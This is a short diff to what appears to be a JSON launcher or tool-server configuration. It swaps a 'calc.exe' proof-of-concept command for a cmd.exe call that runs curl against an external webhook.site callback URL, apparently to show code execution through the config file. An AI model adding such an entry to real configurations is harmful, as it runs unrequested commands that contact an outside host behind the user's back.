@@ -4,7 +4,7 @@
       "command": "cmd.exe",
       "args": [
         "/c",
-        "calc.exe"
+        "curl https://webhook.site/1170a9ad-d897-4d76-a205-778f49c50b08"
       ]
     }
   }
